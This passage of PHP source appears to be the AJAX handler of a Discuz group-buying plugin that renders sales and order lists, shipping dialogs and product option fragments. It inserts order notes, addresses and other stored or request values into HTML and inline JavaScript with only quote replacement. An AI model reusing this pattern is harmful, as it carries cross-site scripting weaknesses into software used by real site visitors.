		<td>'.$strtmp.$it618_salebz.'</td>
		<td>'.$it618_tc.$it618_tuitc.'</td>
		<td><div style="width:100px"><a href="'.it618_tuan_rewriteurl($it618_tuan_sale['it618_uid']).'" target="_blank">'.it618_tuan_getusername($it618_tuan_sale['it618_uid']).'</a><br>'.date('Y-m-d H:i:s', $it618_tuan_sale['it618_time']).'<div></td>
		</tr>';
		

		if($it618_tuan_sale['it618_saletype']==2){
			$strcontent=str_replace("'","\"",$strcontent);
			$strcontent=str_replace(array("\r\n", "\r", "\n"),"<br>",$strcontent);
		
			$tmpjs.='KindEditor.ready(function(K) {K(\'#fahuo'.$it618_tuan_sale[id].'\').click(function() {
				dialog_fahuo = K.dialog({
					width : 660,
					height : 350,
					title : \''.it618_tuan_getlang('s866').'\',
					body : \'<div style="margin:10px;">'.$strcontent.'</div>\',
					closeBtn : {
						name : \''.it618_tuan_getlang('s703').'\',
						click : function(e) {
							dialog_fahuo.remove();
						}
					},
					noBtn : {
						name : \''.it618_tuan_getlang('s703').'\',
						click : function(e) {
							dialog_fahuo.remove();
						}
					}
				});
			});});';
			
			$strsalebz=str_replace("'","\"",$strsalebz);
			$strsalebz=str_replace(array("\r\n", "\r", "\n"),"<br>",$strsalebz);
		}
		
		if($it618_tuan_sale['it618_bz']!=''){
			$it618_tuan_sale['it618_bz']=str_replace("'","\"",$it618_tuan_sale['it618_bz']);
			$it618_tuan_sale['it618_bz']=str_replace(array("\r\n", "\r", "\n"),"<br>",$it618_tuan_sale['it618_bz']);
			
			$tmpjs.='KindEditor.ready(function(K) {K(\'#bz'.$it618_tuan_sale[id].'\').click(function() {
				dialog_bz = K.dialog({
					width : 660,
					height : 350,
					title : \''.it618_tuan_getlang('s867').'\',
					body : \'<div style="margin:10px;">'.$it618_tuan_sale['it618_bz'].'</div>\',
					closeBtn : {
						name : \''.it618_tuan_getlang('s703').'\',
						click : function(e) {
							dialog_bz.remove();
						}
					},
					noBtn : {
						name : \''.it618_tuan_getlang('s703').'\',
						click : function(e) {
							dialog_bz.remove();
						}
					}
				});
			});});';
		}
		
		if($tuistrcontent!=''){
			$tuistrcontent=str_replace("'","\"",$tuistrcontent);
			$tuistrcontent=str_replace(array("\r\n", "\r", "\n"),"<br>",$tuistrcontent);
			
			$tmpjs.='KindEditor.ready(function(K) {K(\'#tui'.$it618_tuan_sale[id].'\').click(function() {
				dialog_tui = K.dialog({
					width : 660,
					height : 350,
					title : \''.it618_tuan_getlang('s868').'\',
					body : \'<div style="margin:10px;">'.$tuistrcontent.'</div>\',
					closeBtn : {
						name : \''.it618_tuan_getlang('s703').'\',
						click : function(e) {
							dialog_tui.remove();
						}
					},
					noBtn : {
						name : \''.it618_tuan_getlang('s703').'\',
						click : function(e) {
							dialog_tui.remove();
						}
					}
				});
			});});';
		}

	}

	
	$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /><script>'.$tmpjs.'</script></td>';
	
	echo $salesum.'it618_split'.$sale_get.'it618_split'.$multipage;
	exit;
}


if($_GET['ac']=="order_get"){
	if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	if($_GET['state']) {
		if($_GET['state']==1)$it618sql .= "s.it618_state = 1";
		if($_GET['state']==2)$it618sql .= "s.it618_state = 2";
		if($_GET['state']==3)$it618sql .= "s.it618_state = 3";
		if($_GET['state']==4)$it618sql .= "s.it618_state = 4";
	}
	
	$ppp = 12;
	
	$count = C::t('#it618_tuan#it618_tuan_order')->count_by_search($ShopId,$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	$summoney = C::t('#it618_tuan#it618_tuan_order')->sum_money_by_search($ShopId,$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$multipage = multi($count, $ppp, $page, "plugin.php?id=it618_tuan:sc_order".$urlsql);
	
	$ordersum= '<td colspan=15>'.it618_tuan_getlang('s1001').'<font color=red>'.$count.'</font> '.it618_tuan_getlang('s1002').'<font color=red>'.$summoney.'</font> <span style="float:right;color:red">'.it618_tuan_getlang('s1010').'</span></td>';
	
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_tuan:ajax");
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='getorderlist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='getorderlist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','getorderlist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
	
	$tmp.='<option value="0">'.it618_tuan_getlang('s698').'</option>';
	foreach(C::t('#it618_tuan#it618_tuan_kd')->fetch_all_by_search() as $it618_tuan_kd) {
		$tmp.='<option value='.$it618_tuan_kd['id'].'>'.$it618_tuan_kd['it618_name'].'</option>';
	}
			
	foreach(C::t('#it618_tuan#it618_tuan_order')->fetch_all_by_search(
		$ShopId,$it618sql,'s.id desc',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp
	) as $it618_tuan_order) {
		
		$it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_tuan_order['it618_pid']);
		$class1name = C::t('#it618_tuan#it618_tuan_class1')->fetch_it618_name_by_id($it618_tuan_goods['it618_class1_id']);
		$class2name = C::t('#it618_tuan#it618_tuan_class2')->fetch_it618_name_by_id($it618_tuan_goods['it618_class2_id']);
		
		if($it618_tuan_order['it618_state']==1)$it618_state='<font color=red>'.it618_tuan_getlang('t325').'</font>';
		if($it618_tuan_order['it618_state']==2)$it618_state='<font color=blue>'.it618_tuan_getlang('t326').'</font>';
		if($it618_tuan_order['it618_state']==3)$it618_state='<font color=#390>'.it618_tuan_getlang('t327').'</font>';
		if($it618_tuan_order['it618_state']==4)$it618_state='<font color=#F0F>'.it618_tuan_getlang('t328').'</font>';
		
		$bz='';$strcontent='';
		if($it618_tuan_order['it618_bz']!=""){
			$bz=' <a href="javascript:" id="bz'.$it618_tuan_order[id].'">'.it618_tuan_getlang('s869').'</a> ';
		}
		
		$bzbtn='';$kdbtn='1';
		
		if($it618_tuan_order['it618_state']<=2){
			if($it618_tuan_order['it618_kddan']==''){
				$it618_state.='<br><a href="javascript:" id="fahuo'.$it618_tuan_order[id].'">'.it618_tuan_getlang('s784').'</a> <a href="javascript:" class="saleabtn" onclick="shopdelorder('.$it618_tuan_order[id].')">'.it618_tuan_getlang('s1030').'</a>';
				$kdbtnname=it618_tuan_getlang('s785');
			}else{
				$kdbtnname=it618_tuan_getlang('s786');
			}
			
			if($it618_tuan_order['it618_state']==2){
				$it618_state.='<br><a href="javascript:" class="saleabtn" onclick="okorder('.$it618_tuan_order[id].',1)">'.it618_tuan_getlang('s1006').'</a> <a href="javascript:" class="saleabtn" onclick="okorder('.$it618_tuan_order[id].',0)">'.it618_tuan_getlang('s1009').'</a>';	
			}
		}else{
			$kdbtnname=it618_tuan_getlang('s787');
			$kdbtn='';
		}
		
		if($kdbtn!='')$kdbtn='<input type="button" class="it618btn" value="'.$kdbtnname.'" onclick="savekd()">';
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		$it618_kddan='';
		if($it618_tuan_order['it618_kddan']!=''){
			$it618_tuan_kd=C::t('#it618_tuan#it618_tuan_kd')->fetch_by_id($it618_tuan_order['it618_kdid']);
			$it618_kddan='<br>'.it618_tuan_getlang('s775').'<span title="'.$it618_tuan_order['it618_bz'].'" style="color:#390">'.$it618_tuan_kd['it618_name'].' '.$it618_tuan_order['it618_kddan'].'</span> <a href="javascript:" id="fahuo'.$it618_tuan_order[id].'">'.$kdbtnname.'</a>';
			
		}
		
		$tmp1=str_replace("<option value=".$it618_tuan_order['it618_kdid'],"<option value=".$it618_tuan_order['it618_kdid']." selected=selected",$tmp);
		
		$strcontent.='<div class="kd_fahuo">'.$it618_tuan_order['it618_name'].' '.$it618_tuan_order['it618_addr'].' '.$it618_tuan_order['it618_tel'].'<br><br>'.it618_tuan_getlang('s699').'<select id="it618_kdid">'.$tmp1.'</select><input type="text" id="it618_kddan" value="'.$it618_tuan_order['it618_kddan'].'"><input type="hidden" id="orderid" value="'.$it618_tuan_order['id'].'"> '.$kdbtn.' <span style="color:red" id="kdtips"></span></div>';
		
		
		$strtel='';
		if($it618_tuan_order['it618_tel']!=""){
			$strtel=it618_tuan_getlang('s701').$it618_tuan_order['it618_tel'];
		}
		
		$strtmp=$strtel.$bz.$it618_kddan;
		
		$gtypename='';
		if($it618_tuan_order['it618_gtypeid']>0){
			$gtypename = C::t('#it618_tuan#it618_tuan_goods_type')->fetch_it618_name_by_id($it618_tuan_order['it618_gtypeid']);
			$gtypename=' [<font color=red>'.$gtypename.'</font>]';
		}
		
		$tmpurl=it618_tuan_getrewrite('tuan_product',$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:product&pid='.$it618_tuan_goods['id']);
		$order_get.='<tr class="hover">
		<td><input class="checkbox" type="checkbox" id="chk_del'.$it618_tuan_order[id].'" name="delete[]" value="'.$it618_tuan_order[id].'" '.$disabled.'><label for="chk_del'.$it618_tuan_order[id].'">'.$it618_tuan_order['id'].'</label></td>
		<td width="330"><a href="'.$tmpurl.'" target="_blank" title="'.$class1name.'-'.$class2name.' '.$it618_tuan_goods['it618_description'].'">'.$it618_tuan_goods['it618_name'].'</a> '.$it618_tuan_goods['it618_mealname'].$gtypename.'</td>
		<td><font color=red>'.$it618_tuan_order['it618_count'].'</font></td>
		<td>'.$it618_state.'</td>
		<td>'.$strtmp.'</td>
		<td><a href="'.it618_tuan_rewriteurl($it618_tuan_order['it618_uid']).'" target="_blank">'.it618_tuan_getusername($it618_tuan_order['it618_uid']).'</a></td>
		<td><div style="width:80px">'.date('Y-m-d H:i:s', $it618_tuan_order['it618_time']).'<div></td>
		</tr>';
		
		$strcontent=str_replace("'","\"",$strcontent);
		$strcontent=str_replace(array("\r\n", "\r", "\n"),"<br>",$strcontent);
	
		$tmpjs.='KindEditor.ready(function(K) {K(\'#fahuo'.$it618_tuan_order[id].'\').click(function() {
			dialog_fahuo = K.dialog({
				width : 660,
				height : 350,
				title : \''.it618_tuan_getlang('s866').'\',
				body : \'<div style="margin:10px;">'.$strcontent.'</div>\',
				closeBtn : {
					name : \''.it618_tuan_getlang('s703').'\',
					click : function(e) {
						dialog_fahuo.remove();
					}
				},
				noBtn : {
					name : \''.it618_tuan_getlang('s703').'\',
					click : function(e) {
						dialog_fahuo.remove();
					}
				}
			});
		});});';
		
		if($it618_tuan_order['it618_bz']!=''){
			$it618_tuan_order['it618_bz']=str_replace("'","\"",$it618_tuan_order['it618_bz']);
			$it618_tuan_order['it618_bz']=str_replace(array("\r\n", "\r", "\n"),"<br>",$it618_tuan_order['it618_bz']);
			
			$tmpjs.='KindEditor.ready(function(K) {K(\'#bz'.$it618_tuan_order[id].'\').click(function() {
				dialog_bz = K.dialog({
					width : 660,
					height : 350,
					title : \''.it618_tuan_getlang('s867').'\',
					body : \'<div style="margin:10px;">'.$it618_tuan_order['it618_bz'].'</div>\',
					closeBtn : {
						name : \''.it618_tuan_getlang('s703').'\',
						click : function(e) {
							dialog_bz.remove();
						}
					},
					noBtn : {
						name : \''.it618_tuan_getlang('s703').'\',
						click : function(e) {
							dialog_bz.remove();
						}
					}
				});
			});});';
		}
	}
	
	$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /><script>'.$tmpjs.'</script></td>';
	
	echo $ordersum.'it618_split'.$order_get.'it618_split'.$multipage;
	exit;
}


if($_GET['ac']=="tuanstyle"){
	$tuanstyle=getcookie('tuanstyle');
	if($tuanstyle==''){
		if($it618_tuan['tuan_style']==3)$tuanstyle='1';else $tuanstyle='2';
	}
	if($tuanstyle=='1')$tuanstyle='2';else $tuanstyle='1';
	dsetcookie('tuanstyle',$tuanstyle,31536000);
	echo 'ok';
	exit;
}

$n=1;
if($_GET['ac']=="getproductclass"){
	$classtmp='<a class="current" href="javascript:void(0)" onclick="setselect(\'productclass2\',0,0)" name="productclass2"><span>'.$it618_tuan_lang['s466'].'</span><i></i></a>';
	foreach(C::t('#it618_tuan#it618_tuan_class2')->fetch_all_by_it618_class1_id($_GET['cid']) as $it618_tmp) {	
		$classtmp.='<a href="javascript:void(0)" onclick="setselect(\'productclass2\','.$n.','.$it618_tmp['id'].')" name="productclass2"><span>'.$it618_tmp['it618_classname'].'</span><i></i></a>';
		$n=$n+1;
	}
	echo $classtmp;
	exit;
}

$n=1;
if($_GET['ac']=="getproductarea"){
	$areatmp='<a class="current" href="javascript:void(0)" onclick="setselect(\'productarea2\',0,0)" name="productarea2"><span>'.$it618_tuan_lang['s466'].'</span><i></i></a>';
	foreach(C::t('#it618_tuan#it618_tuan_area2')->fetch_all_by_it618_area1_id($_GET['aid']) as $it618_tmp) {	
		$areatmp.='<a href="javascript:void(0)" onclick="setselect(\'productarea2\','.$n.','.$it618_tmp['id'].')" name="productarea2"><span>'.$it618_tmp['it618_name'].'</span><i></i></a>';
		$n=$n+1;
	}
	echo $areatmp;
	exit;
}


if($_GET['ac']=="getgoodstype"){
	if($it618_tuan_goods_type=C::t('#it618_tuan#it618_tuan_goods_type')->fetch_by_pid_name_name1_ok($_GET['pid'],it618_tuan_utftogbk($_GET['gtypename']),it618_tuan_utftogbk($_GET['gtypename1']))){
		
		if($it618_tuan_goods_type['it618_saleprice']>0&&$it618_tuan_goods_type['it618_score']>0){
			$goodsjfname=$_G['setting']['extcredits'][$it618_tuan_goods_type['it618_jfid']]['title'];
			$goodspricestr='<em>&yen;</em>'.$it618_tuan_goods_type['it618_saleprice'].' + '.$it618_tuan_goods_type['it618_score'].'<em>'.$goodsjfname.'</em>';
		}else{
			if($it618_tuan_goods_type['it618_saleprice']>0){
				$goodspricestr='<em>&yen;</em>'.$it618_tuan_goods_type['it618_saleprice'];
				$paytype=$it618_tuan_lang['t304'];
			}
			
			if($it618_tuan_goods_type['it618_score']>0){
				$goodsjfname=$_G['setting']['extcredits'][$it618_tuan_goods_type['it618_jfid']]['title'];
				$goodspricestr=$it618_tuan_goods_type['it618_score'].'<em style="padding-left:6px">'.$goodsjfname.'</em>';
			}
		}
		
		if($_GET['wap']==1){
			if($it618_tuan_goods_type['it618_price']>0){
				$goodspricestr.=' <del style="color:#999;font-size:12px"><em style="font-size:12px">&yen;</em>'.$it618_tuan_goods_type['it618_price'].'</del>';
			}
		}

		$salecount=$it618_tuan_goods_type['it618_salecount'];
		
		echo $goodspricestr.'it618_split<font color=#999>'.$it618_tuan_lang['t114'].' <font style="color:red">'.$salecount.'</font> '.$it618_tuan_lang['t197'].' <font style="color:red">'.$it618_tuan_goods_type['it618_count'].'</font></font>it618_split'.$it618_tuan_goods_type['id'].'it618_split'.$it618_tuan_goods_type['it618_price'];
	}else{
		echo 'reload';
	}
	exit;
}


if($_GET['ac']=="getgoodstypename1"){
	$n=0;
	foreach(C::t('#it618_tuan#it618_tuan_goods_type')->fetch_name1_by_it618_pid_name($_GET['pid'],it618_tuan_utftogbk($_GET['gtypename'])) as $it618_tuan_goods_type) {
		$tmpstr='';
		if($n==0){
			$tmpstr='class="current"';
			$goodstypename1=$it618_tuan_goods_type['it618_name1'];
		}
		$goodstypestr1.='<a '.$tmpstr.' href="javascript:void(0)" onclick="setselect(\'goodstype1\','.$n.',\''.$it618_tuan_goods_type['it618_name1'].'\')" name="goodstype1"><span>'.$it618_tuan_goods_type['it618_name1'].'</span><i></i></a>';
		$n++;
	}
	
	if($goodstypestr1!=''){
		echo $goodstypestr1.'it618_split'.$goodstypename1;
	}else{
		echo '';
	}
	exit;
}


if($_GET['ac']=="getgoodsthd"){
	if(C::t('#it618_tuan#it618_tuan_goods_thd')->count_by_pid_thdid($_GET['pid'],$_GET['gtid'])>0){
		$it618_tuan_shop_thd=C::t('#it618_tuan#it618_tuan_shop_thd')->fetch_by_id($_GET['gtid']);
		
		if($it618_tuan_shop_thd['it618_kefuqq']!=''){
			$qqarr=explode(",",$it618_tuan_shop_thd['it618_kefuqq']);
			$qqnamearr=explode(",",$it618_tuan_shop_thd['it618_kefuqqname']);
			for($i=0;$i<count($qqarr);$i++)
			{
				if($qqarr[$i]!='')$shopthdqq.='<a target="_blank" href="https://wpa.qq.com/msgrd?v=3&uin='.$qqarr[$i].'&site=qq&menu=yes"><img border="0" src="source/plugin/it618_tuan/images/qqbtnsmall.gif" style="vertical-align:middle"/>'.$qqnamearr[$i].'</a> ';
				
			}
			
		}
		
		if($it618_tuan_shop_thd['it618_mappoint']!=''&&$it618_tuan['tuan_bdkey']!=''){
			if($_GET['wap']!=1){
				$tmpcss='width="638"';
			}else{
				$tmpcss='width="100%"';
			}
			$mapstr='<br><div id="map" class="map"><iframe id="iframe_shopthd" '.$tmpcss.' style="margin-top:3px" height="330" marginwidth="0" marginheight="0"  frameborder="no" scrolling="no"  src="plugin.php?id=it618_tuan:map&tid='.$it618_tuan_shop_thd['id'].'&iframe=1"></iframe></div>';
		}

		echo '<img src="source/plugin/it618_tuan/images/collapsed_yes.gif" title="'.$it618_tuan_lang['s1732'].'" style="float:right;cursor:pointer" id="img_shopthd" onClick="collapsed_thd(\'span_shopthd\',\'img_shopthd\',\'iframe_shopthd\')"><font color=#999>'.$it618_tuan_lang['s1729'].'</font>'.$it618_tuan_shop_thd['it618_addr'].'<br><font color=#999>'.$it618_tuan_lang['s1730'].'</font>'.$shopthdqq.'<br><font color=#999>'.$it618_tuan_lang['t134'].'</font>'.$it618_tuan_shop_thd['it618_dianhua'].' '.$it618_tuan_shop_thd['it618_yytime'].'<span id="span_shopthd" style="display:none"><br><font color=#999>'.$it618_tuan_lang['s1731'].'</font>'.$it618_tuan_shop_thd['it618_about'].$mapstr.'</span>';
	}else{
		echo 'reload';
	}
	exit;
}
//From: di'.'sm.t'.'aoba'.'o.com
?>